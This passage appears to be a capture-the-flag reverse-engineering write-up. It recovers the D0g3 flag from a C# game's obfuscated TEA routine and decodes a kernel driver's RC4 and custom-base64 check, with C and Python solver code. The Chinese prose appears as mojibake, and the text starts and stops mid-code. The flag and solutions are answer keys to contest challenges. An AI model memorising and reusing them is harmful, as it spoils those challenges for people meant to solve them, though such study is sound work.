AAABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB(str);</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªæŠ½è±¡çš„å®šä¹‰ï¼Œæ‰€ä»¥ç›´æ¥è¿›teaçœ‹çœ‹</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">uint</span>[] <span class="title">tea</span>(<span class="params"><span class="built_in">uint</span> ABBAABAAAAAABAAAABBBBBBABAABAAAABBBABBBAABBABBA, <span class="built_in">uint</span> BAABBAAAAABABBAABBABBAABABABABABABAAABABBBABABA</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">uint</span> v0 = ABBAABAAAAAABAAAABBBBBBABAABAAAABBBABBBAABBABBA;</span><br><span class="line"><span class="built_in">uint</span> v = BAABBAAAAABABBAABBABBAABABABABABABAAABABBBABABA;</span><br><span class="line"><span class="built_in">uint</span> sum = <span class="number">1U</span>;</span><br><span class="line"><span class="built_in">uint</span> delta = <span class="number">4294967252U</span>;</span><br><span class="line"><span class="built_in">uint</span>[] str2 = <span class="keyword">this</span>.BBABABBBABBABABAAABBBAABBAAAAAAABBBBBAABBAAAAAA;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt; <span class="number">-103</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">sum += delta;</span><br><span class="line">v0 += ((v &lt;&lt; <span class="number">7</span>) + str2[<span class="number">1</span>] ^ v + sum ^ (v &gt;&gt; <span class="number">0</span>) + str2[<span class="number">1</span>]);</span><br><span class="line">v += ((v0 &lt;&lt; <span class="number">7</span>) + str2[<span class="number">5</span>] ^ v0 + sum ^ (v0 &gt;&gt; <span class="number">4</span>) + str2[<span class="number">8</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">uint</span>[] array = <span class="keyword">new</span> <span class="built_in">uint</span>[<span class="number">8</span>];</span><br><span class="line">array[<span class="number">0</span>] = v0;</span><br><span class="line">array[<span class="number">0</span>] = v;</span><br><span class="line"><span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œè¿˜éœ€è¦str2çš„å€¼ï¼Œåœ¨GameManagerçš„ä¸Šé¢éƒ¨åˆ†å†™äº†</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uint[] str = <span class="keyword">new</span> uint[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">286331153U,</span></span><br><span class="line"><span class="built_in">286331153U,</span></span><br><span class="line"><span class="built_in">286331153U,</span></span><br><span class="line"><span class="number">286331153</span>U</span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line">AAABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB str2 = <span class="keyword">new</span> AAABAAABABABAAABBABBABAAAABBAABBAABABBBBBABAAAB(str)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>å¯çŸ¥ï¼Œ</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encryptedData = encryptedData.Concat(str2.BBBABAABAAABBAAABBBAABBAAAAAABABBBBBBABBABABAAB(<span class="built_in">uint</span>Array[i], <span class="built_in">uint</span>Array[i + <span class="number">0</span>])).ToArray&lt;<span class="built_in">uint</span>&gt;();</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„str2å°±æ˜¯è¿™å››ä¸ªå€¼ï¼Œkeyä¹Ÿå°±æ˜¯è¿™å››ä¸ªå€¼</p><p>æœ€åè¿˜è¦åœ¨åŠ å¯†çš„ç±»é‡Œé¢çœ‹å“ªä¸ªæ˜¯æ­£ç¡®çš„åŠ å¯†å‡½æ•°ï¼ˆæœ‰ä¸€å †teaï¼‰ï¼Œæ£€æŸ¥içš„å€¼ï¼ˆä¸åº”è¯¥æ˜¯æ— é™å¾ªç¯ï¼‰å’Œkeyæ•°ç»„çš„ä¸ªæ•°ï¼ˆ0åˆ°3ï¼‰</p><p>æœ€ååªå‰©ä¸€ä¸ª</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">uint</span>[] <span class="title">BABBBBBBAAAAAABABBBAAAABBABBBAABABAAABABBAAABBA</span>(<span class="params"><span class="built_in">uint</span> ABBAABAAAAAABAAAABBBBBBABAABAAAABBBABBBAABBABBA, <span class="built_in">uint</span> BAABBAAAAABABBAABBABBAABABABABABABAAABABBBABABA</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">uint</span> v0 = ABBAABAAAAAABAAAABBBBBBABAABAAAABBBABBBAABBABBA;</span><br><span class="line"><span class="built_in">uint</span> v = BAABBAAAAABABBAABBABBAABABABABABABAAABABBBABABA;</span><br><span class="line"><span class="built_in">uint</span> sum = <span class="number">0U</span>;</span><br><span class="line"><span class="built_in">uint</span> delta = <span class="number">2654435769U</span>;</span><br><span class="line"><span class="built_in">uint</span>[] str2 = <span class="keyword">this</span>.BBABABBBABBABABAAABBBAABBAAAAAAABBBBBAABBAAAAAA;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">sum += delta;</span><br><span class="line">v0 += ((v &lt;&lt; <span class="number">4</span>) + str2[<span class="number">0</span>] ^ v + sum ^ (v &gt;&gt; <span class="number">5</span>) + str2[<span class="number">1</span>]);</span><br><span class="line">v += ((v0 &lt;&lt; <span class="number">4</span>) + str2[<span class="number">2</span>] ^ v0 + sum ^ (v0 &gt;&gt; <span class="number">5</span>) + str2[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">uint</span>[]</span><br><span class="line">&#123;</span><br><span class="line">v0,</span><br><span class="line">v</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå†™teaè§£å¯†å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b2; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b1; </span><br><span class="line">    b1 = *a;</span><br><span class="line">    b2 = a[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> e = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tt[<span class="number">4</span>] = &#123; <span class="number">0x11111111</span>, <span class="number">0x11111111</span>, <span class="number">0x11111111</span>, <span class="number">0x11111111</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i) &#123;</span><br><span class="line">        </span><br><span class="line">        b2 -= ((b1 &lt;&lt; <span class="number">4</span>) + tt[<span class="number">2</span>] ^ b1 + sum ^ (b1 &gt;&gt; <span class="number">5</span>) + tt[<span class="number">3</span>]);</span><br><span class="line">        b1 -= ((b2 &lt;&lt; <span class="number">4</span>) + tt[<span class="number">0</span>] ^ b2 + sum ^ (b2 &gt;&gt; <span class="number">5</span>) + tt[<span class="number">1</span>]);</span><br><span class="line">        sum -= e;</span><br><span class="line">    &#125;</span><br><span class="line">    *a = b1;</span><br><span class="line">    a[<span class="number">1</span>] = b2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Q[<span class="number">12</span>] = &#123; <span class="number">0xc873914f</span>,</span><br><span class="line">                            <span class="number">0x4a628600</span>,</span><br><span class="line">                            <span class="number">0x20c77a1c</span>,</span><br><span class="line">                            <span class="number">0x1a877aaa</span>,</span><br><span class="line">                            <span class="number">0xd6faa982</span>,</span><br><span class="line">                            <span class="number">0x60d1c964</span>,</span><br><span class="line">                            <span class="number">0xb9884c32</span>,</span><br><span class="line">                            <span class="number">0x2a08a862</span>,</span><br><span class="line">                            <span class="number">0xc74a0036</span>,</span><br><span class="line">                            <span class="number">0x8f2ee196</span>,</span><br><span class="line">                            <span class="number">0xef08a6a9</span>,</span><br><span class="line">                            <span class="number">0xa3850896</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">6</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        dec(&amp;Q[k*<span class="number">2</span>]);</span><br><span class="line">        <span class="comment">//sdecrypt(&amp;Q[k * 2], &amp;Q[k * 2 + 1]);</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%#x,\n&quot;</span>, Q[i]);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//0x695f7469,</span></span><br><span class="line"><span class="comment">//0x65625f73,</span></span><br><span class="line"><span class="comment">//0x615f6e65,</span></span><br><span class="line"><span class="comment">//0x6e6f6c5f,</span></span><br><span class="line"><span class="comment">//0x61645f67,</span></span><br><span class="line"><span class="comment">//0x69775f79,</span></span><br><span class="line"><span class="comment">//0x756f6874,</span></span><br><span class="line"><span class="comment">//0x6f795f74,</span></span><br><span class="line"><span class="comment">//0x796d5f75,</span></span><br><span class="line"><span class="comment">//0x6972665f,</span></span><br><span class="line"><span class="comment">//0x646e65,</span></span><br></pre></td></tr></table></figure><p>ç„¶åæŒ‰è¡Œå–åè½¬hexå†å…¨å–åå¾—åˆ°ç»“æœï¼š</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">it_is_been_<span class="built_in">a_long</span>_day_without_you_my_friend</span><br></pre></td></tr></table></figure><p>å³</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;it_is_been_<span class="built_in">a_long</span>_day_without_you_my_friend&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="æ„Ÿè§‰æœ‰ç‚¹ç‚¹ç®€å•">æ„Ÿè§‰æœ‰ç‚¹ç‚¹ç®€å•</h2><p>è¿™æ˜¯ä¸€ä¸ªsysæ–‡ä»¶ï¼Œæ ¹æ®ç½‘ä¸Šæ•™ç¨‹</p><blockquote><p>é™æ€IDA<br>åŠ¨æ€SICE æˆ–è€… Syser</p></blockquote><p>å…ˆå°è¯•ç”¨idaæ‰“å¼€</p><p>è¿›å…¥ä¸»è¦çš„æ£€æŸ¥å‡½æ•°</p><p>æ‰¾åˆ°å…³é”®ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_BYTE)v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( HIDWORD(v1) &lt;= <span class="number">0xC00</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        rc4(NumberOfBytes_4, HIDWORD(v1), <span class="string">&quot;the_key_&quot;</span>, <span class="number">8</span>i64, v1);</span><br><span class="line">        base64(P, NumberOfBytes_4, HIDWORD(v1));</span><br><span class="line">        LOBYTE(v1) = sub_140001560(P, <span class="number">56</span>i64);</span><br><span class="line">        v8 = <span class="string">&quot;tips: YES, RIGHT FLAG.   you got it!&quot;</span>;</span><br><span class="line">        v7 = <span class="string">&quot;tips: NO , WRONG ANSWER. try again !&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v1 )</span><br><span class="line">          DbgPrint(<span class="string">&quot;tips: %s\n&quot;</span>, v8);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          DbgPrint(<span class="string">&quot;tips: %s\n&quot;</span>, v7);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;tips: file to long \n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">NumberOfBytes_4</span> = ExAllocatePool(NonPagedPool, <span class="number">0</span>x1000ui64)<span class="comment">;</span></span><br><span class="line"><span class="attr">P</span> = ExAllocatePool(NonPagedPool, <span class="number">0</span>x1000ui64)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªæŒ‡é’ˆçš„åˆå§‹åŒ–ç”¨äº†ExAllocatePoolå‡½æ•°</p><p>è¿™æ˜¯å†…æ ¸æ¨¡å¼ä¸‹çš„å†…å­˜åˆ†é…å‡½æ•°ï¼Œæ„æ€æ˜¯ä»éåˆ†é¡µæ± ä¸­åˆ†é…4096å­—èŠ‚ç»™ä¸¤ä¸ªæŒ‡é’ˆ</p><p>åœ¨æœ€åæœ‰ExFreePoolWithTagé‡Šæ”¾è¿™ä¸¤ä¸ªç©ºé—´ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ç±»ä¼¼äºmallocå’Œfree</p><p>åœ¨æœ€åLOBYTE(v1) = sub_140001560(P, 56i64);   // æ¯”è¾ƒå‡½æ•°è¿›è¡Œäº†æ¯”è¾ƒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_140001560</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a2 == <span class="number">56</span> &amp;&amp; !(<span class="type">unsigned</span> <span class="type">int</span>)sub_1400019F0(a1, <span class="string">&quot;6zviISn2McHsa4b108v29tbKMtQQXQHA+2+sTYLlg9v2Q2Pq8SP24Uw=&quot;</span>, <span class="number">56</span>i64);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„æ€æ˜¯ä»¤a1ç­‰äºåé¢çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´æ‹¿åˆ°Pçš„ç»ˆå€¼äº†ï¼š</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>zviIS<span class="symbol">n2</span>McHsa<span class="number">4</span>b<span class="number">108</span>v<span class="number">29</span>tbKMtQQXQHA<span class="number">+2</span>+sTYLl<span class="name">g9</span>v<span class="number">2</span>Q<span class="number">2</span>Pq<span class="number">8</span>SP<span class="number">24</span>Uw=</span><br></pre></td></tr></table></figure><p>å› ä¸ºotheré€šè¿‡è‡ªå®šä¹‰base64è½¬æ¢æˆPæ‰€ä»¥otherç»ˆå€¼ç›´æ¥æ”¾base64è§£ç æ˜¯</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">otherl = [<span class="number">0x70</span>,<span class="number">0x5c</span>,<span class="number">0x9e</span>,<span class="number">0xcc</span>,<span class="number">0x4d</span>,<span class="number">0x4c</span>,<span class="number">0xe2</span>,<span class="number">0x08</span>,</span><br><span class="line">          <span class="number">0x8e</span>,<span class="number">0xac</span>,<span class="number">0x00</span>,<span class="number">0xd0</span>,<span class="number">0x5b</span>,<span class="number">0x0c</span>,<span class="number">0x8c</span>,<span class="number">0x95</span>,</span><br><span class="line">          <span class="number">0x80</span>,<span class="number">0xc1</span>,<span class="number">0xe1</span>,<span class="number">0x85</span>,<span class="number">0x14</span>,<span class="number">0xf1</span>,<span class="number">0x48</span>,<span class="number">0x92</span>,</span><br><span class="line">          <span class="number">0x4c</span>,<span class="number">0xc4</span>,<span class="number">0xce</span>,<span class="number">0xee</span>,<span class="number">0x4d</span>,<span class="number">0x89</span>,<span class="number">0x36</span>,<span class="number">0x5c</span>,</span><br><span class="line">          <span class="number">0x8c</span>,<span class="number">0x50</span>,<span class="number">0xc8</span>,<span class="number">0xd1</span>,<span class="number">0xc0</span>,<span class="number">0x48</span>,<span class="number">0xcc</span>,<span class="number">0x03</span>,</span><br><span class="line">          <span class="number">0x11</span>]</span><br></pre></td></tr></table></figure><p>ä¸å¯¹ï¼Œè¿™ä¸ªbase64ä¸æ˜¯å¸¸è§„çš„ï¼Œè¦è‡ªå·±å†™è§£å¯†å‡½æ•°ï¼Œå› ä¸ºåŠ å¯†éƒ¨åˆ†æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(a1 + v5) = v6[*(_BYTE *)(a2 + v4) &amp; <span class="number">0x3F</span>];</span><br><span class="line">   *(_BYTE *)(a1 + v5 + <span class="number">1</span>) = v6[(<span class="number">4</span> * (*(_BYTE *)(a2 + v4 + <span class="number">1</span>) &amp; <span class="number">0xF</span>)) | ((*(_BYTE *)(a2 + v4) &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">   *(_BYTE *)(a1 + v5 + <span class="number">2</span>) = v6[(<span class="number">16</span> * (*(_BYTE *)(a2 + v4 + <span class="number">2</span>) &amp; <span class="number">3</span>)) | ((*(_BYTE *)(a2 + v4 + <span class="number">1</span>) &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">   *(_BYTE *)(a1 + v5 + <span class="number">3</span>) = v6[(*(_BYTE *)(a2 + v4 + <span class="number">2</span>) &amp; <span class="number">0xFC</span>) &gt;&gt; <span class="number">2</span>];</span><br></pre></td></tr></table></figure><p>åŠ å¯†è¿‡ç¨‹æ˜¯ï¼š</p><p>a =0ä½å6ä¸ª</p><p>b=0ä½å‰2å’Œ1ä½å4ç»„åˆ</p><p>c=2ä½å2å’Œ1ä½å‰4</p><p>d=2ä½å‰6</p><p>æ‰€ä»¥ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">num = [<span class="number">0</span>]*<span class="number">42</span></span><br><span class="line"><span class="built_in">input</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="built_in">list</span>(<span class="string">&#x27;6zviISn2McHsa4b108v29tbKMtQQXQHA+2+sTYLlg9v2Q2Pq8SP24Uw&#x27;</span>)<span class="comment">#æœ€åå‰©ä¸‰ä¸ª</span></span><br><span class="line">table = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;4KBbSzwWClkZ2gsr1qA+Qu0FtxOm6/iVcJHPY9GNp7EaRoDf8UvIjnL5MydTX3eh&#x27;</span>]</span><br><span class="line">tl = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">way</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">        <span class="keyword">if</span> (table[i]==n):</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    tl.append(<span class="built_in">ord</span>(last[i]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(num),<span class="number">3</span>):</span><br><span class="line"></span><br><span class="line">    num[i] = ((way(tl[j])) | (((way(tl[j+<span class="number">1</span>])) &amp; <span class="number">3</span>)  &lt;&lt; <span class="number">6</span>))</span><br><span class="line">    num[i+<span class="number">1</span>] = (((way(tl[j+<span class="number">1</span>]) &amp; <span class="number">0x3c</span>) &gt;&gt; <span class="number">2</span>) | ((way(tl[j+<span class="number">2</span>]) &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>))</span><br><span class="line">    <span class="keyword">if</span> ((j+<span class="number">3</span>) &lt; <span class="built_in">len</span>(num)):</span><br><span class="line">        num[i+<span class="number">2</span>] = ((way(tl[j+<span class="number">3</span>]) &lt;&lt; <span class="number">2</span>) | ((way(tl[j+<span class="number">2</span>]) &amp; <span class="number">0x3c</span>) &gt;&gt; <span class="number">4</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        num[i+<span class="number">2</span>] = ((way(tl[j+<span class="number">2</span>]) &amp; <span class="number">0x3c</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line">    j += <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">    <span class="built_in">input</span> += <span class="built_in">chr</span>(num[i])</span><br><span class="line">hnum = [<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> num]</span><br><span class="line"><span class="built_in">print</span>(hnum)</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">input</span>)</span><br><span class="line"><span class="comment">#[&#x27;0x5c&#x27;, &#x27;0x21&#x27;, &#x27;0x7b&#x27;, &#x27;0x33&#x27;, &#x27;0x51&#x27;, &#x27;0x33&#x27;, &#x27;0x38&#x27;, &#x27;0x28&#x27;, &#x27;0x3a&#x27;, &#x27;0x2b&#x27;, &#x27;0x30&#x27;, &#x27;0x40&#x27;, &#x27;0x16&#x27;, &#x27;0x2c&#x27;, &#x27;0x33&#x27;, &#x27;0x25&#x27;, &#x27;0x36&#x27;, &#x27;0x4&#x27;, &#x27;0x38&#x27;, &#x27;0x46&#x27;, &#x27;0x51&#x27;, &#x27;0x3c&#x27;, &#x27;0x25&#x27;, &#x27;0x4a&#x27;, &#x27;0x13&#x27;, &#x27;0x33&#x27;, &#x27;0x39&#x27;, &#x27;0x3b&#x27;, &#x27;0x69&#x27;, &#x27;0x27&#x27;, &#x27;0x4d&#x27;, &#x27;0x29&#x27;, &#x27;0x3&#x27;, &#x27;0x14&#x27;, &#x27;0x33&#x27;, &#x27;0x2&#x27;, &#x27;0x30&#x27;, &#x27;0x31&#x27;, &#x27;0x2&#x27;, &#x27;0x40&#x27;, &#x27;0x6c&#x27;, &#x27;0x0&#x27;]</span></span><br><span class="line"><span class="comment">#[92, 33, 123, 51, 81, 51, 56, 40, 58, 43, 48, 64, 22, 44, 51, 37, 54, 4, 56, 70, 81, 60, 37, 74, 19, 51, 57, 59, 105, 39, 77, 41, 3, 20, 51, 2, 48, 49, 2, 64, 108, 0]</span></span><br><span class="line"><span class="comment">#\!&#123;3Q38(:+0@,3%68FQ&lt;%J39;i&#x27;M)301@l</span></span><br></pre></td></tr></table></figure><p>è¦æ³¨æ„ï¼š</p><ul><li>é€†å‘æ—¶ä½æ•°æ˜¯6ï¼Œå·¦ç§»å³ç§»å’Œä¸çš„å€¼è¦æ³¨æ„</li><li>pyå·¦ç§»æ—¶ä¸ä¼šæº¢å‡º</li><li>æœ€åå‰©äº†ä¸‰ä¸ªè¦åˆ†æƒ…å†µ</li></ul><p>å¾—åˆ°å€¼</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[92, 33, 123, 51, 81, 51, 56, 40, 58, 43, 48, 64, 22, 44, 51, 37, 54, 4, 56, 70, 81, 60, 37, 74, 19, 51, 57, 59, 105, 39, 77, 41, 3, 20, 51, 2, 48, 49, 2, 64, 108, 0]</span></span><br></pre></td></tr></table></figure><p>æœ€ååœ¨ä¸Šé¢é‚£ä¸ªå‡½æ•°rc4</p><p>å› ä¸ºè¿™é‡Œæ˜¯å¯¹ç§°åŠ å¯†ï¼Œç›´æ¥å¤åˆ¶å…¶å®å°±å¯ä»¥äº†ï¼Œæˆ–è€…å¦‚æœä¼šè°ƒè¯•sysï¼Œç›´æ¥è¾“å…¥å¯†æ–‡å°±å¥½äº†</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">otherl = [<span class="number">92</span>, <span class="number">33</span>, <span class="number">123</span>, <span class="number">51</span>, <span class="number">81</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">40</span>, <span class="number">58</span>, <span class="number">43</span>, <span class="number">48</span>, <span class="number">64</span>, <span 